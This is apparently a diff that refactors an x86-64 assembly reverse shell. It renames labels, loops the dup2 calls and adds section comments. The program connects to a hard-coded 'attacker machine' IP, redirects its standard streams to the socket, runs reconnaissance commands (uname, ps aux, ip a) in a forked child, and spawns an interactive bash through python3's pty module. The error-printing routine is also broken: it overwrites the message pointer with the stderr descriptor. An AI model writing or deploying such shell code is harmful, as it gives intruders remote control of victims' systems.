@@ -1,8 +1,12 @@
-bits 64
+BITS 64
 
-global _start
+GLOBAL _start
 
-section .bss
+; ------------------------------------------
+; SECTION: Uninitialized Data (BSS)
+; ------------------------------------------
+
+SECTION .bss
 struc sockaddr_in
         sin_family      resw 1
         sin_port        resw 1
@@ -10,7 +14,11 @@ struc sockaddr_in
 endstruc
 sock_fd resd 1
 
-section .rodata
+; ------------------------------------------
+; SECTION: Read-Only Data (Constants)
+; ------------------------------------------
+
+SECTION .rodata
 sh_cmd db "/usr/bin/python3", 0
 arg1 db "-c", 0
 arg2 db "import pty; pty.spawn('/bin/bash')", 0
@@ -24,6 +32,10 @@ err_connect db "[-] Connection failed", 10, 0
 err_dup2 db "[-] dup2 failed", 10, 0
 err_exec db "[-] execve failed", 10, 0
 
+; ------------------------------------------
+; SECTION: Network Configuration
+; ------------------------------------------
+
 init_struct:
         istruc sockaddr_in                      
                 at sin_family,  dw 2            ; AF_INET (IPv4)
@@ -31,19 +43,23 @@ init_struct:
                 at sin_addr,    dd 0xD702210A   ; IP 10.33.2.215 (little-endian)
         iend
 
-section .text
+; ------------------------------------------
+; SECTION: Code (Main Execution)
+; ------------------------------------------
+
+SECTION .text
 _start:
-        ; Create socket
+        ; Create a socket
         mov rax, 41                             ; syscall: socket
         mov rdi, 2                              ; domain: AF_INET (IPv4)
         mov rsi, 1                              ; type: SOCK_STREAM
         mov rdx, 6                              ; protocol: IPPROTO_TCP
         syscall
         test rax, rax                           ; Check if syscall failed
-        js error_socket                         ; Jump if error (rax < 0)
+        js handle_socket_error                  ; Jump if error (rax < 0)
         mov [sock_fd], rax                      ; Save socket FD
 
-connect_socket:
+connect_to_host:
         ; Connect to attacker machine
         mov rax, 42                             ; syscall: connect
         mov rdi, [sock_fd]                      ; socket FD
@@ -51,41 +67,27 @@ connect_socket:
         mov rdx, 16                             ; size of sockaddr_in
         syscall
         test rax, rax
-        js error_connect
+        js handle_connect_error
 
-dup_stdin:
-        ; Duplicate socket FD to stdin (0)
+redirect_fds:
+        ; Duplicate socket FD to stdin, stdout, and stderr
+        mov rsi, 0
+.loop:
         mov rax, 33                             ; syscall: dup2
         mov rdi, [sock_fd]
-        mov rsi, 0
         syscall
         test rax, rax
-        js error_dup2
+        js handle_dup2_error
+        inc rsi
+        cmp rsi, 3
+        jl .loop
 
-dup_stdout:
-        ; Duplicate socket FD to stdout (1)
-        mov rax, 33
-        mov rdi, [sock_fd]
-        mov rsi, 1
-        syscall
-        test rax, rax
-        js error_dup2
-
-dup_stderr:
-        ; Duplicate socket FD to stderr (2)
-        mov rax, 33
-        mov rdi, [sock_fd]
-        mov rsi, 2
-        syscall
-        test rax, rax
-        js error_dup2
-
-system_info:
+execute_system_info:
         ; Fork a process
         mov rax, 57                             ; syscall: fork
         syscall
         test rax, rax
-        jnz init_shell                          ; If parent, continue to shell
+        jnz execute_interactive_shell           ; If parent, continue to shell
 
         ; Child process executes system info command
         mov rax, 59                             ; syscall: execve
@@ -93,9 +95,9 @@ system_info:
         lea rsi, [rel info_args]                ; argv = {"/bin/sh", "-c", "uname -a; uname -m; ps aux; ip a", NULL}
         xor rdx, rdx                            ; envp = NULL
         syscall
-        jmp exit                                ; If exec fails, exit child
+        jmp exit_program                        ; If exec fails, exit child
 
-init_shell:
+execute_interactive_shell:
         ; Execute Python3 to spawn a fully interactive Bash shell
         mov rax, 59                             ; syscall: execve
         mov rdi, sh_cmd                         ; path: /usr/bin/python3
@@ -103,7 +105,11 @@ init_shell:
         xor rdx, rdx                            ; envp = NULL
         syscall
         test rax, rax
-        js error_exec                           ; If execve fails, show error and exit
+        js handle_exec_error                    ; If execve fails, show error and exit
+
+; ------------------------------------------
+; ARGUMENT ARRAYS FOR EXECVE
+; ------------------------------------------
 
 args:
         dq sh_cmd
@@ -121,27 +127,31 @@ info_args:
 ; ERROR HANDLING ROUTINES
 ; ------------------------------------------
 
-error_socket:
+handle_socket_error:
         mov rdi, err_socket
-        call print_error
-        jmp exit
+        call display_error_message
+        jmp exit_program
 
-error_connect:
+handle_connect_error:
         mov rdi, err_connect
-        call print_error
-        jmp exit
+        call display_error_message
+        jmp exit_program
 
-error_dup2:
+handle_dup2_error:
         mov rdi, err_dup2
-        call print_error
-        jmp exit
+        call display_error_message
+        jmp exit_program
 
-error_exec:
+handle_exec_error:
         mov rdi, err_exec
-        call print_error
-        jmp exit
+        call display_error_message
+        jmp exit_program
 
-print_error:
+; ------------------------------------------
+; ERROR PRINTING FUNCTION
+; ------------------------------------------
+
+display_error_message:
         mov rax, 1                              ; syscall: write
         mov rdi, 2                              ; stderr
         mov rsi, rdi                            ; error message
@@ -149,7 +159,11 @@ print_error:
         syscall
         ret
 
-exit:
+; ------------------------------------------
+; EXIT PROGRAM FUNCTION
+; ------------------------------------------
+
+exit_program:
         mov rax, 60                             ; syscall: exit
         xor rdi, rdi                            ; exit(0)
         syscall
